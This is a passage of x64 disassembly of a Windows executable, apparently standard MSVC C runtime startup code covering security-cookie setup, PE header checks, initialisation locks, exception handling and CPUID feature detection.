0000000140006630  sub      rsp, 0x28                                        ; 0x28
0000000140006634  call     0x140006930                                      ; 0x140006930
0000000140006639  add      rsp, 0x28                                        ; 0x28
000000014000663d  jmp      0x1400064b0                                      ; 0x1400064b0
0000000140006642  int3                                                     
0000000140006643  int3                                                     
0000000140006644  int3                                                     
0000000140006645  int3                                                     
0000000140006646  int3                                                     
0000000140006647  int3                                                     
0000000140006648  int3                                                     
0000000140006649  int3                                                     
000000014000664a  int3                                                     
000000014000664b  int3                                                     
000000014000664c  int3                                                     
000000014000664d  int3                                                     
000000014000664e  int3                                                     
000000014000664f  int3                                                     

; FUNCTION 0x140006650

0000000140006650  sub      rsp, 0x28                                        ; 0x28
0000000140006654  call     0x140006ee0                                      ; 0x140006ee0
0000000140006659  test     eax, eax                                        
000000014000665b  je       0x140006689                                      ; 0x140006689
000000014000665d  mov      rax, qword ptr gs:[0x30]                        
0000000140006666  mov      rcx, qword ptr [rax + 8]                        
000000014000666a  xor      eax, eax                                        
000000014000666c  lock cmpxchg qword ptr [rip + 0x5b33], rcx                    ; 0x14000c1a8
0000000140006675  je       0x140006689                                      ; 0x140006689
0000000140006677  cmp      rcx, rax                                        
000000014000667a  je       0x140006690                                      ; 0x140006690
000000014000667c  xor      eax, eax                                        
000000014000667e  lock cmpxchg qword ptr [rip + 0x5b21], rcx                    ; 0x14000c1a8
0000000140006687  jne      0x140006677                                      ; 0x140006677
0000000140006689  xor      al, al                                          
000000014000668b  add      rsp, 0x28                                        ; 0x28
000000014000668f  ret                                                      
0000000140006690  mov      al, 1                                            ; 0x1
0000000140006692  add      rsp, 0x28                                        ; 0x28
0000000140006696  ret                                                      
0000000140006697  int3                                                     
0000000140006698  int3                                                     
0000000140006699  int3                                                     
000000014000669a  int3                                                     
000000014000669b  int3                                                     
000000014000669c  int3                                                     
000000014000669d  int3                                                     
000000014000669e  int3                                                     
000000014000669f  int3                                                     

; FUNCTION 0x1400066a0

00000001400066a0  sub      rsp, 0x28                                        ; 0x28
00000001400066a4  test     ecx, ecx                                        
00000001400066a6  jne      0x1400066af                                      ; 0x1400066af
00000001400066a8  mov      byte ptr [rip + 0x5b01], 1                       ; 0x14000c1b0 | 0x1
00000001400066af  call     0x140006c30                                      ; 0x140006c30
00000001400066b4  call     0x140006a30                                      ; 0x140006a30
00000001400066b9  test     al, al                                          
00000001400066bb  je       0x1400066cd                                      ; 0x1400066cd
00000001400066bd  call     0x140006a30                                      ; 0x140006a30
00000001400066c2  test     al, al                                          
00000001400066c4  jne      0x1400066d4                                      ; 0x1400066d4
00000001400066c6  xor      ecx, ecx                                        
00000001400066c8  call     0x140006a30                                      ; 0x140006a30
00000001400066cd  xor      al, al                                          
00000001400066cf  add      rsp, 0x28                                        ; 0x28
00000001400066d3  ret                                                      
00000001400066d4  mov      al, 1                                            ; 0x1
00000001400066d6  add      rsp, 0x28                                        ; 0x28
00000001400066da  ret                                                      
00000001400066db  int3                                                     
00000001400066dc  int3                                                     
00000001400066dd  int3                                                     
00000001400066de  int3                                                     
00000001400066df  int3                                                     

; FUNCTION 0x1400066e0

00000001400066e0  push     rbx                                             
00000001400066e2  sub      rsp, 0x20                                        ; 0x20
00000001400066e6  cmp      byte ptr [rip + 0x5ac4], 0                       ; 0x14000c1b1 | 0x0
00000001400066ed  mov      ebx, ecx                                        
00000001400066ef  jne      0x140006760                                      ; 0x140006760
00000001400066f1  cmp      ecx, 1                                           ; 0x1
00000001400066f4  ja       0x140006768                                      ; 0x140006768
00000001400066f6  call     0x140006ee0                                      ; 0x140006ee0
00000001400066fb  test     eax, eax                                        
00000001400066fd  je       0x14000672b                                      ; 0x14000672b
00000001400066ff  test     ebx, ebx                                        
0000000140006701  jne      0x14000672b                                      ; 0x14000672b
0000000140006703  lea      rcx, [rip + 0x5aae]                              ; 0x14000c1b8
000000014000670a  call     0x140006f98                                      ; 0x140006f98
000000014000670f  test     eax, eax                                        
0000000140006711  jne      0x140006723                                      ; 0x140006723
0000000140006713  lea      rcx, [rip + 0x5ab6]                              ; 0x14000c1d0
000000014000671a  call     0x140006f98                                      ; 0x140006f98
000000014000671f  test     eax, eax                                        
0000000140006721  je       0x140006759                                      ; 0x140006759
0000000140006723  xor      al, al                                          
0000000140006725  add      rsp, 0x20                                        ; 0x20
0000000140006729  pop      rbx                                             
000000014000672a  ret                                                      
000000014000672b  movdqa   xmm0, xmmword ptr [rip + 0x1efd]                 ; 0x140008630
0000000140006733  movdqu   xmmword ptr [rip + 0x5a7d], xmm0                 ; 0x14000c1b8
000000014000673b  mov      qword ptr [rip + 0x5a82], 0xffffffffffffffff     ; 0x14000c1c8 | -0x1
0000000140006746  movdqu   xmmword ptr [rip + 0x5a82], xmm0                 ; 0x14000c1d0
000000014000674e  mov      qword ptr [rip + 0x5a87], 0xffffffffffffffff     ; 0x14000c1e0 | -0x1
0000000140006759  mov      byte ptr [rip + 0x5a51], 1                       ; 0x14000c1b1 | 0x1
0000000140006760  mov      al, 1                                            ; 0x1
0000000140006762  add      rsp, 0x20                                        ; 0x20
0000000140006766  pop      rbx                                             
0000000140006767  ret                                                      
0000000140006768  mov      ecx, 5                                           ; 0x5
000000014000676d  call     0x140006aa0                                      ; 0x140006aa0
0000000140006772  int3                                                     
0000000140006773  int3                                                     
0000000140006774  int3                                                     
0000000140006775  int3                                                     
0000000140006776  int3                                                     
0000000140006777  int3                                                     
0000000140006778  int3                                                     
0000000140006779  int3                                                     
000000014000677a  int3                                                     
000000014000677b  int3                                                     
000000014000677c  int3                                                     
000000014000677d  int3                                                     
000000014000677e  int3                                                     
000000014000677f  int3                                                     

; FUNCTION 0x140006780

0000000140006780  sub      rsp, 0x18                                        ; 0x18
0000000140006784  mov      r8, rcx                                         
0000000140006787  mov      eax, 0x5a4d                                      ; 0x5a4d
000000014000678c  cmp      word ptr [rip - 0x6793], ax                      ; 0x140000000
0000000140006793  jne      0x140006806                                      ; 0x140006806
0000000140006795  movsxd   rcx, dword ptr [rip - 0x6760]                    ; 0x14000003c
000000014000679c  lea      rdx, [rip - 0x67a3]                              ; 0x140000000
00000001400067a3  add      rcx, rdx                                        
00000001400067a6  cmp      dword ptr [rcx], 0x4550                          ; 0x4550
00000001400067ac  jne      0x140006806                                      ; 0x140006806
00000001400067ae  mov      eax, 0x20b                                       ; 0x20b
00000001400067b3  cmp      word ptr [rcx + 0x18], ax                       
00000001400067b7  jne      0x140006806                                      ; 0x140006806
00000001400067b9  sub      r8, rdx                                         
00000001400067bc  movzx    eax, word ptr [rcx + 0x14]                      
00000001400067c0  add      rax, 0x18                                        ; 0x18
00000001400067c4  add      rax, rcx                                        
00000001400067c7  movzx    ecx, word ptr [rcx + 6]                         
00000001400067cb  lea      rdx, [rcx + rcx*4]                              
00000001400067cf  lea      r9, [rax + rdx*8]                               
00000001400067d3  mov      qword ptr [rsp], rax                            
00000001400067d7  cmp      rax, r9                                         
00000001400067da  je       0x140006802                                      ; 0x140006802
00000001400067dc  mov      edx, dword ptr [rax + 0xc]                      
00000001400067df  cmp      r8, rdx                                         
00000001400067e2  jb       0x1400067fc                                      ; 0x1400067fc
00000001400067e4  mov      ecx, dword ptr [rax + 8]                        
00000001400067e7  add      ecx, edx                                        
00000001400067e9  cmp      r8, rcx                                         
00000001400067ec  jae      0x1400067fc                                      ; 0x1400067fc
00000001400067ee  cmp      dword ptr [rax + 0x24], 0                        ; 0x0
00000001400067f2  jge      0x1400067f8                                      ; 0x1400067f8
00000001400067f4  xor      al, al                                          
00000001400067f6  jmp      0x14000680c                                      ; 0x14000680c
00000001400067f8  mov      al, 1                                            ; 0x1
00000001400067fa  jmp      0x14000680c                                      ; 0x14000680c
00000001400067fc  add      rax, 0x28                                        ; 0x28
0000000140006800  jmp      0x1400067d3                                      ; 0x1400067d3
0000000140006802  xor      al, al                                          
0000000140006804  jmp      0x14000680c                                      ; 0x14000680c
0000000140006806  xor      al, al                                          
0000000140006808  jmp      0x14000680c                                      ; 0x14000680c
000000014000680a  xor      al, al                                          
000000014000680c  add      rsp, 0x18                                        ; 0x18
0000000140006810  ret                                                      
0000000140006811  int3                                                     
0000000140006812  int3                                                     
0000000140006813  int3                                                     
0000000140006814  int3                                                     
0000000140006815  int3                                                     
0000000140006816  int3                                                     
0000000140006817  int3                                                     
0000000140006818  int3                                                     
0000000140006819  int3                                                     
000000014000681a  int3                                                     
000000014000681b  int3                                                     
000000014000681c  int3                                                     
000000014000681d  int3                                                     
000000014000681e  int3                                                     
000000014000681f  int3                                                     

; FUNCTION 0x140006820

0000000140006820  push     rbx                                             
0000000140006822  sub      rsp, 0x20                                        ; 0x20
0000000140006826  movzx    ebx, cl                                         
0000000140006829  call     0x140006ee0                                      ; 0x140006ee0
000000014000682e  test     eax, eax                                        
0000000140006830  je       0x14000683f                                      ; 0x14000683f
0000000140006832  test     bl, bl                                          
0000000140006834  jne      0x14000683f                                      ; 0x14000683f
0000000140006836  xor      eax, eax                                        
0000000140006838  xchg     qword ptr [rip + 0x5969], rax                    ; 0x14000c1a8
000000014000683f  add      rsp, 0x20                                        ; 0x20
0000000140006843  pop      rbx                                             
0000000140006844  ret                                                      
0000000140006845  int3                                                     
0000000140006846  int3                                                     
0000000140006847  int3                                                     
0000000140006848  int3                                                     
0000000140006849  int3                                                     
000000014000684a  int3                                                     
000000014000684b  int3                                                     
000000014000684c  int3                                                     
000000014000684d  int3                                                     
000000014000684e  int3                                                     
000000014000684f  int3                                                     

; FUNCTION 0x140006850

0000000140006850  push     rbx                                             
0000000140006852  sub      rsp, 0x20                                        ; 0x20
0000000140006856  cmp      byte ptr [rip + 0x5953], 0                       ; 0x14000c1b0 | 0x0
000000014000685d  movzx    ebx, cl                                         
0000000140006860  je       0x140006866                                      ; 0x140006866
0000000140006862  test     dl, dl                                          
0000000140006864  jne      0x140006873                                      ; 0x140006873
0000000140006866  call     0x140006a30                                      ; 0x140006a30
000000014000686b  movzx    ecx, bl                                         
000000014000686e  call     0x140006a30                                      ; 0x140006a30
0000000140006873  mov      al, 1                                            ; 0x1
0000000140006875  add      rsp, 0x20                                        ; 0x20
0000000140006879  pop      rbx                                             
000000014000687a  ret                                                      
000000014000687b  int3                                                     
000000014000687c  int3                                                     
000000014000687d  int3                                                     
000000014000687e  int3                                                     
000000014000687f  int3                                                     

; FUNCTION 0x140006880

0000000140006880  push     rbx                                             
0000000140006882  sub      rsp, 0x20                                        ; 0x20
0000000140006886  cmp      qword ptr [rip + 0x592a], -1                     ; 0x14000c1b8 | -0x1
000000014000688e  mov      rbx, rcx                                        
0000000140006891  jne      0x14000689a                                      ; 0x14000689a
0000000140006893  call     0x140006fa4                                      ; 0x140006fa4
0000000140006898  jmp      0x1400068a9                                      ; 0x1400068a9
000000014000689a  mov      rdx, rbx                                        
000000014000689d  lea      rcx, [rip + 0x5914]                              ; 0x14000c1b8
00000001400068a4  call     0x140006f9e                                      ; 0x140006f9e
00000001400068a9  xor      edx, edx                                        
00000001400068ab  test     eax, eax                                        
00000001400068ad  cmove    rdx, rbx                                        
00000001400068b1  neg      rdx                                             
00000001400068b4  sbb      eax, eax                                        
00000001400068b6  neg      eax                                             
00000001400068b8  dec      eax                                             
00000001400068ba  add      rsp, 0x20                                        ; 0x20
00000001400068be  pop      rbx                                             
00000001400068bf  ret                                                      
00000001400068c0  ret      0                                                ; 0x0
00000001400068c3  int3                                                     
00000001400068c4  int3                                                     
00000001400068c5  int3                                                     
00000001400068c6  int3                                                     
00000001400068c7  int3                                                     
00000001400068c8  int3                                                     
00000001400068c9  int3                                                     
00000001400068ca  int3                                                     
00000001400068cb  int3                                                     
00000001400068cc  int3                                                     
00000001400068cd  int3                                                     
00000001400068ce  int3                                                     
00000001400068cf  int3                                                     
00000001400068d0  mov      ecx, 2                                           ; 0x2
00000001400068d5  int      0x29                                             ; 0x29
00000001400068d7  ret                                                      
00000001400068d8  int3                                                     
00000001400068d9  int3                                                     
00000001400068da  int3                                                     
00000001400068db  int3                                                     
00000001400068dc  int3                                                     
00000001400068dd  int3                                                     
00000001400068de  int3                                                     
00000001400068df  int3                                                     
00000001400068e0  lea      rax, [rip + 0x1d89]                              ; 0x140008670 "bad allocation"
00000001400068e7  mov      qword ptr [rcx + 0x10], 0                        ; 0x0
00000001400068ef  mov      qword ptr [rcx + 8], rax                        
00000001400068f3  lea      rax, [rip + 0x1d66]                              ; 0x140008660
00000001400068fa  mov      qword ptr [rcx], rax                            
00000001400068fd  mov      rax, rcx                                        
0000000140006900  ret                                                      
0000000140006901  int3                                                     
0000000140006902  int3                                                     
0000000140006903  int3                                                     
0000000140006904  int3                                                     
0000000140006905  int3                                                     
0000000140006906  int3                                                     
0000000140006907  int3                                                     
0000000140006908  int3                                                     
0000000140006909  int3                                                     
000000014000690a  int3                                                     
000000014000690b  int3                                                     
000000014000690c  int3                                                     
000000014000690d  int3                                                     
000000014000690e  int3                                                     
000000014000690f  int3                                                     

; FUNCTION 0x140006910

0000000140006910  sub      rsp, 0x48                                        ; 0x48
0000000140006914  lea      rcx, [rsp + 0x20]                               
0000000140006919  call     0x1400068e0                                      ; 0x1400068e0
000000014000691e  lea      rdx, [rip + 0x389b]                              ; 0x14000a1c0
0000000140006925  lea      rcx, [rsp + 0x20]                               
000000014000692a  call     0x140006f02                                      ; 0x140006f02
000000014000692f  int3                                                     

; FUNCTION 0x140006930

0000000140006930  push     rbx                                             
0000000140006932  sub      rsp, 0x30                                        ; 0x30
0000000140006936  mov      rax, qword ptr [rip + 0x5703]                    ; 0x14000c040
000000014000693d  movabs   rbx, 0x2b992ddfa232                              ; 0x2b992ddfa232
0000000140006947  cmp      rax, rbx                                        
000000014000694a  je       0x14000695c                                      ; 0x14000695c
000000014000694c  not      rax                                             
000000014000694f  mov      qword ptr [rip + 0x572a], rax                    ; 0x14000c080
0000000140006956  add      rsp, 0x30                                        ; 0x30
000000014000695a  pop      rbx                                             
000000014000695b  ret                                                      
000000014000695c  lea      rcx, [rsp + 0x40]                               
0000000140006961  mov      qword ptr [rsp + 0x40], 0                        ; 0x0
000000014000696a  call     qword ptr [rip + 0x1820]                         ; 0x140008190 KERNEL32.DLL!GetSystemTimeAsFileTime
0000000140006970  mov      rax, qword ptr [rsp + 0x40]                     
0000000140006975  mov      qword ptr [rsp + 0x20], rax                     
000000014000697a  call     qword ptr [rip + 0x1818]                         ; 0x140008198 KERNEL32.DLL!GetCurrentThreadId
0000000140006980  mov      eax, eax                                        
0000000140006982  xor      qword ptr [rsp + 0x20], rax                     
0000000140006987  call     qword ptr [rip + 0x1813]                         ; 0x1400081a0 KERNEL32.DLL!GetCurrentProcessId
000000014000698d  mov      eax, eax                                        
000000014000698f  lea      rcx, [rsp + 0x48]                               
0000000140006994  xor      qword ptr [rsp + 0x20], rax                     
0000000140006999  call     qword ptr [rip + 0x1809]                         ; 0x1400081a8 KERNEL32.DLL!QueryPerformanceCounter
000000014000699f  mov      rax, qword ptr [rsp + 0x48]                     
00000001400069a4  mov      ecx, eax                                        
00000001400069a6  shl      rcx, 0x20                                        ; 0x20
00000001400069aa  xor      rcx, rax                                        
00000001400069ad  lea      rax, [rsp + 0x20]                               
00000001400069b2  xor      rcx, qword ptr [rsp + 0x20]                     
00000001400069b7  xor      rcx, rax                                        
00000001400069ba  movabs   rax, 0xffffffffffff                              ; 0xffffffffffff
00000001400069c4  and      rcx, rax                                        
00000001400069c7  movabs   rax, 0x2b992ddfa233                              ; 0x2b992ddfa233
00000001400069d1  cmp      rcx, rbx                                        
00000001400069d4  cmove    rcx, rax                                        
00000001400069d8  mov      qword ptr [rip + 0x5661], rcx                    ; 0x14000c040
00000001400069df  not      rcx                                             
00000001400069e2  mov      qword ptr [rip + 0x5697], rcx                    ; 0x14000c080
00000001400069e9  add      rsp, 0x30                                        ; 0x30
00000001400069ed  pop      rbx                                             
00000001400069ee  ret                                                      
00000001400069ef  int3                                                     
00000001400069f0  xor      eax, eax                                        
00000001400069f2  ret                                                      
00000001400069f3  int3                                                     
00000001400069f4  int3                                                     
00000001400069f5  int3                                                     
00000001400069f6  int3                                                     
00000001400069f7  int3                                                     
00000001400069f8  int3                                                     
00000001400069f9  int3                                                     
00000001400069fa  int3                                                     
00000001400069fb  int3                                                     
00000001400069fc  int3                                                     
00000001400069fd  int3                                                     
00000001400069fe  int3                                                     
00000001400069ff  int3                                                     
0000000140006a00  mov      eax, 1                                           ; 0x1
0000000140006a05  ret                                                      
0000000140006a06  int3                                                     
0000000140006a07  int3                                                     
0000000140006a08  int3                                                     
0000000140006a09  int3                                                     
0000000140006a0a  int3                                                     
0000000140006a0b  int3                                                     
0000000140006a0c  int3                                                     
0000000140006a0d  int3                                                     
0000000140006a0e  int3                                                     
0000000140006a0f  int3                                                     
0000000140006a10  mov      eax, 0x4000                                      ; 0x4000
0000000140006a15  ret                                                      
0000000140006a16  int3                                                     
0000000140006a17  int3                                                     
0000000140006a18  int3                                                     
0000000140006a19  int3                                                     
0000000140006a1a  int3                                                     
0000000140006a1b  int3                                                     
0000000140006a1c  int3                                                     
0000000140006a1d  int3                                                     
0000000140006a1e  int3                                                     
0000000140006a1f  int3                                                     
0000000140006a20  lea      rcx, [rip + 0x57c9]                              ; 0x14000c1f0
0000000140006a27  jmp      qword ptr [rip + 0x175a]                         ; 0x140008188 KERNEL32.DLL!InitializeSListHead
0000000140006a2e  int3                                                     
0000000140006a2f  int3                                                     
0000000140006a30  mov      al, 1                                            ; 0x1
0000000140006a32  ret                                                      
0000000140006a33  int3                                                     
0000000140006a34  int3                                                     
0000000140006a35  int3                                                     
0000000140006a36  int3                                                     
0000000140006a37  int3                                                     
0000000140006a38  int3                                                     
0000000140006a39  int3                                                     
0000000140006a3a  int3                                                     
0000000140006a3b  int3                                                     
0000000140006a3c  int3                                                     
0000000140006a3d  int3                                                     
0000000140006a3e  int3                                                     
0000000140006a3f  int3                                                     
0000000140006a40  lea      rax, [rip + 0x57b9]                              ; 0x14000c200
0000000140006a47  ret                                                      
0000000140006a48  int3                                                     
0000000140006a49  int3                                                     
0000000140006a4a  int3                                                     
0000000140006a4b  int3                                                     
0000000140006a4c  int3                                                     
0000000140006a4d  int3                                                     
0000000140006a4e  int3                                                     
0000000140006a4f  int3                                                     

; FUNCTION 0x140006a50

0000000140006a50  sub      rsp, 0x28                                        ; 0x28
0000000140006a54  call     0x140001010                                      ; 0x140001010
0000000140006a59  or       qword ptr [rax], 0x24                            ; 0x24
0000000140006a5d  call     0x140006a40                                      ; 0x140006a40
0000000140006a62  or       qword ptr [rax], 2                               ; 0x2
0000000140006a66  add      rsp, 0x28                                        ; 0x28
0000000140006a6a  ret                                                      
0000000140006a6b  int3                                                     
0000000140006a6c  int3                                                     
0000000140006a6d  int3                                                     
0000000140006a6e  int3                                                     
0000000140006a6f  int3                                                     
0000000140006a70  xor      eax, eax                                        
0000000140006a72  cmp      dword ptr [rip + 0x5610], eax                    ; 0x14000c088
0000000140006a78  sete     al                                              
0000000140006a7b  ret                                                      
0000000140006a7c  int3                                                     
0000000140006a7d  int3                                                     
0000000140006a7e  int3                                                     
0000000140006a7f  int3                                                     
0000000140006a80  lea      rax, [rip + 0x5861]                              ; 0x14000c2e8
0000000140006a87  ret                                                      
0000000140006a88  int3                                                     
0000000140006a89  int3                                                     
0000000140006a8a  int3                                                     
0000000140006a8b  int3                                                     
0000000140006a8c  int3                                                     
0000000140006a8d  int3                                                     
0000000140006a8e  int3                                                     
0000000140006a8f  int3                                                     
0000000140006a90  lea      rax, [rip + 0x5849]                              ; 0x14000c2e0
0000000140006a97  ret                                                      
0000000140006a98  int3                                                     
0000000140006a99  int3                                                     
0000000140006a9a  int3                                                     
0000000140006a9b  int3                                                     
0000000140006a9c  int3                                                     
0000000140006a9d  int3                                                     
0000000140006a9e  int3                                                     
0000000140006a9f  int3                                                     
0000000140006aa0  mov      ecx, ecx                                        
0000000140006aa2  int      0x29                                             ; 0x29
0000000140006aa4  ret                                                      
0000000140006aa5  int3                                                     
0000000140006aa6  int3                                                     
0000000140006aa7  int3                                                     
0000000140006aa8  int3                                                     
0000000140006aa9  int3                                                     
0000000140006aaa  int3                                                     
0000000140006aab  int3                                                     
0000000140006aac  int3                                                     
0000000140006aad  int3                                                     
0000000140006aae  int3                                                     
0000000140006aaf  int3                                                     
0000000140006ab0  jmp      0x1400069f0                                      ; 0x1400069f0
0000000140006ab5  int3                                                     
0000000140006ab6  int3                                                     
0000000140006ab7  int3                                                     
0000000140006ab8  int3                                                     
0000000140006ab9  int3                                                     
0000000140006aba  int3                                                     
0000000140006abb  int3                                                     
0000000140006abc  int3                                                     
0000000140006abd  int3                                                     
0000000140006abe  int3                                                     
0000000140006abf  int3                                                     

; FUNCTION 0x140006ac0

0000000140006ac0  sub      rsp, 0x28                                        ; 0x28
0000000140006ac4  xor      ecx, ecx                                        
0000000140006ac6  call     qword ptr [rip + 0x16ac]                         ; 0x140008178 KERNEL32.DLL!GetModuleHandleW
0000000140006acc  test     rax, rax                                        
0000000140006acf  je       0x140006b0e                                      ; 0x140006b0e
0000000140006ad1  mov      ecx, 0x5a4d                                      ; 0x5a4d
0000000140006ad6  cmp      word ptr [rax], cx                              
0000000140006ad9  jne      0x140006b0e                                      ; 0x140006b0e
0000000140006adb  movsxd   rcx, dword ptr [rax + 0x3c]                     
0000000140006adf  cmp      dword ptr [rcx + rax], 0x4550                    ; 0x4550
0000000140006ae6  jne      0x140006b0e                                      ; 0x140006b0e
0000000140006ae8  mov      edx, 0x20b                                       ; 0x20b
0000000140006aed  cmp      word ptr [rcx + rax + 0x18], dx                 
0000000140006af2  jne      0x140006b0e                                      ; 0x140006b0e
0000000140006af4  cmp      dword ptr [rcx + rax + 0x84], 0xe                ; 0xe
0000000140006afc  jbe      0x140006b0e                                      ; 0x140006b0e
0000000140006afe  cmp      dword ptr [rcx + rax + 0xf8], 0                  ; 0x0
0000000140006b06  setne    al                                              
0000000140006b09  add      rsp, 0x28                                        ; 0x28
0000000140006b0d  ret                                                      
0000000140006b0e  xor      al, al                                          
0000000140006b10  add      rsp, 0x28                                        ; 0x28
0000000140006b14  ret                                                      
0000000140006b15  int3                                                     
0000000140006b16  int3                                                     
0000000140006b17  int3                                                     
0000000140006b18  int3                                                     
0000000140006b19  int3                                                     
0000000140006b1a  int3                                                     
0000000140006b1b  int3                                                     
0000000140006b1c  int3                                                     
0000000140006b1d  int3                                                     
0000000140006b1e  int3                                                     
0000000140006b1f  int3                                                     
0000000140006b20  lea      rcx, [rip + 9]                                   ; 0x140006b30
0000000140006b27  jmp      qword ptr [rip + 0x1652]                         ; 0x140008180 KERNEL32.DLL!SetUnhandledExceptionFilter
0000000140006b2e  int3                                                     
0000000140006b2f  int3                                                     

; FUNCTION 0x140006b30

0000000140006b30  mov      qword ptr [rsp + 8], rbx                        
0000000140006b35  push     rdi                                             
0000000140006b36  sub      rsp, 0x20                                        ; 0x20
0000000140006b3a  mov      rbx, qword ptr [rcx]                            
0000000140006b3d  mov      rdi, rcx                                        
0000000140006b40  cmp      dword ptr [rbx], 0xe06d7363                      ; 0xe06d7363
0000000140006b46  jne      0x140006b64                                      ; 0x140006b64
0000000140006b48  cmp      dword ptr [rbx + 0x18], 4                        ; 0x4
0000000140006b4c  jne      0x140006b64                                      ; 0x140006b64
0000000140006b4e  mov      edx, dword ptr [rbx + 0x20]                     
0000000140006b51  lea      eax, [rdx - 0x19930520]                         
0000000140006b57  cmp      eax, 2                                           ; 0x2
0000000140006b5a  jbe      0x140006b71                                      ; 0x140006b71
0000000140006b5c  cmp      edx, 0x1994000                                   ; 0x1994000
0000000140006b62  je       0x140006b71                                      ; 0x140006b71
0000000140006b64  mov      rbx, qword ptr [rsp + 0x30]                     
0000000140006b69  xor      eax, eax                                        
0000000140006b6b  add      rsp, 0x20                                        ; 0x20
0000000140006b6f  pop      rdi                                             
0000000140006b70  ret                                                      
0000000140006b71  call     0x140006f08                                      ; 0x140006f08
0000000140006b76  mov      qword ptr [rax], rbx                            
0000000140006b79  mov      rbx, qword ptr [rdi + 8]                        
0000000140006b7d  call     0x140006f0e                                      ; 0x140006f0e
0000000140006b82  mov      qword ptr [rax], rbx                            
0000000140006b85  call     0x140006faa                                      ; 0x140006faa
0000000140006b8a  int3                                                     
0000000140006b8b  int3                                                     
0000000140006b8c  int3                                                     
0000000140006b8d  int3                                                     
0000000140006b8e  int3                                                     
0000000140006b8f  int3                                                     

; FUNCTION 0x140006b90

0000000140006b90  mov      qword ptr [rsp + 8], rbx                        
0000000140006b95  push     rdi                                             
0000000140006b96  sub      rsp, 0x20                                        ; 0x20
0000000140006b9a  lea      rbx, [rip + 0x2fcf]                              ; 0x140009b70
0000000140006ba1  lea      rdi, [rip + 0x2fc8]                              ; 0x140009b70
0000000140006ba8  cmp      rbx, rdi                                        
0000000140006bab  jae      0x140006bc7                                      ; 0x140006bc7
0000000140006bad  nop      dword ptr [rax]                                 
0000000140006bb0  mov      rax, qword ptr [rbx]                            
0000000140006bb3  test     rax, rax                                        
0000000140006bb6  je       0x140006bbe                                      ; 0x140006bbe
0000000140006bb8  call     qword ptr [rip + 0x19d2]                         ; 0x140008590
0000000140006bbe  add      rbx, 8                                           ; 0x8
0000000140006bc2  cmp      rbx, rdi                                        
0000000140006bc5  jb       0x140006bb0                                      ; 0x140006bb0
0000000140006bc7  mov      rbx, qword ptr [rsp + 0x30]                     
0000000140006bcc  add      rsp, 0x20                                        ; 0x20
0000000140006bd0  pop      rdi                                             
0000000140006bd1  ret                                                      
0000000140006bd2  int3                                                     
0000000140006bd3  int3                                                     
0000000140006bd4  int3                                                     
0000000140006bd5  int3                                                     
0000000140006bd6  int3                                                     
0000000140006bd7  int3                                                     
0000000140006bd8  int3                                                     
0000000140006bd9  int3                                                     
0000000140006bda  int3                                                     
0000000140006bdb  int3                                                     
0000000140006bdc  int3                                                     
0000000140006bdd  int3                                                     
0000000140006bde  int3                                                     
0000000140006bdf  int3                                                     

; FUNCTION 0x140006be0

0000000140006be0  mov      qword ptr [rsp + 8], rbx                        
0000000140006be5  push     rdi                                             
0000000140006be6  sub      rsp, 0x20                                        ; 0x20
0000000140006bea  lea      rbx, [rip + 0x2f8f]                              ; 0x140009b80
0000000140006bf1  lea      rdi, [rip + 0x2f88]                              ; 0x140009b80
0000000140006bf8  cmp      rbx, rdi                                        
0000000140006bfb  jae      0x140006c17                                      ; 0x140006c17
0000000140006bfd  nop      dword ptr [rax]                                 
0000000140006c00  mov      rax, qword ptr [rbx]                            
0000000140006c03  test     rax, rax                                        
0000000140006c06  je       0x140006c0e                                      ; 0x140006c0e
0000000140006c08  call     qword ptr [rip + 0x1982]                         ; 0x140008590
0000000140006c0e  add      rbx, 8                                           ; 0x8
0000000140006c12  cmp      rbx, rdi                                        
0000000140006c15  jb       0x140006c00                                      ; 0x140006c00
0000000140006c17  mov      rbx, qword ptr [rsp + 0x30]                     
0000000140006c1c  add      rsp, 0x20                                        ; 0x20
0000000140006c20  pop      rdi                                             
0000000140006c21  ret                                                      
0000000140006c22  int3                                                     
0000000140006c23  int3                                                     
0000000140006c24  int3                                                     
0000000140006c25  int3                                                     
0000000140006c26  int3                                                     
0000000140006c27  int3                                                     
0000000140006c28  int3                                                     
0000000140006c29  int3                                                     
0000000140006c2a  int3                                                     
0000000140006c2b  int3                                                     
0000000140006c2c  int3                                                     
0000000140006c2d  int3                                                     
0000000140006c2e  int3                                                     
0000000140006c2f  int3                                                     

; FUNCTION 0x140006c30

0000000140006c30  push     rsi                                             
0000000140006c32  push     rdi                                             
0000000140006c33  push     r14                                             
0000000140006c35  sub      rsp, 0x10                                        ; 0x10
0000000140006c39  xor      ecx, ecx                                        

; FUNCTION 0x140006c3b

0000000140006c3b  mov      qword ptr [rsp + 0x38], rbx                     
0000000140006c40  xor      eax, eax                                        
0000000140006c42  cpuid                                                    
0000000140006c44  xor      ecx, 0x6c65746e                                  ; 0x6c65746e
0000000140006c4a  xor      edx, 0x49656e69                                  ; 0x49656e69
0000000140006c50  or       edx, ecx                                        
0000000140006c52  xor      ebx, 0x756e6547                                  ; 0x756e6547
0000000140006c58  mov      r11d, eax                                       
0000000140006c5b  or       edx, ebx                                        
0000000140006c5d  mov      eax, 1                                           ; 0x1
0000000140006c62  mov      ecx, 0                                           ; 0x0
0000000140006c67  cpuid                                                    
0000000140006c69  mov      edi, ecx                                        
0000000140006c6b  jne      0x140006ccb                                      ; 0x140006ccb
0000000140006c6d  and      eax, 0xfff3ff0                                   ; 0xfff3ff0
0000000140006c72  mov      qword ptr [rip + 0x541b], 0x8000                 ; 0x14000c098 | 0x8000
0000000140006c7d  mov      qword ptr [rip + 0x5418], 0xffffffffffffffff     ; 0x14000c0a0 | -0x1
0000000140006c88  cmp      eax, 0x106c0                                     ; 0x106c0
0000000140006c8d  je       0x140006cb7                                      ; 0x140006cb7
0000000140006c8f  cmp      eax, 0x20660                                     ; 0x20660
0000000140006c94  je       0x140006cb7                                      ; 0x140006cb7
0000000140006c96  cmp      eax, 0x20670                                     ; 0x20670
0000000140006c9b  je       0x140006cb7                                      ; 0x140006cb7
0000000140006c9d  add      eax, 0xfffcf9b0                                  ; 0xfffcf9b0
0000000140006ca2  cmp      eax, 0x20                                        ; 0x20
0000000140006ca5  ja       0x140006ccb                                      ; 0x140006ccb
0000000140006ca7  movabs   rcx, 0x100010001                                 ; 0x100010001
0000000140006cb1  bt       rcx, rax                                        
0000000140006cb5  jae      0x140006ccb                                      ; 0x140006ccb
0000000140006cb7  mov      r8d, dword ptr [rip + 0x554e]                    ; 0x14000c20c
0000000140006cbe  or       r8d, 1                                           ; 0x1
0000000140006cc2  mov      dword ptr [rip + 0x5543], r8d                    ; 0x14000c20c
0000000140006cc9  jmp      0x140006cd2                                      ; 0x140006cd2
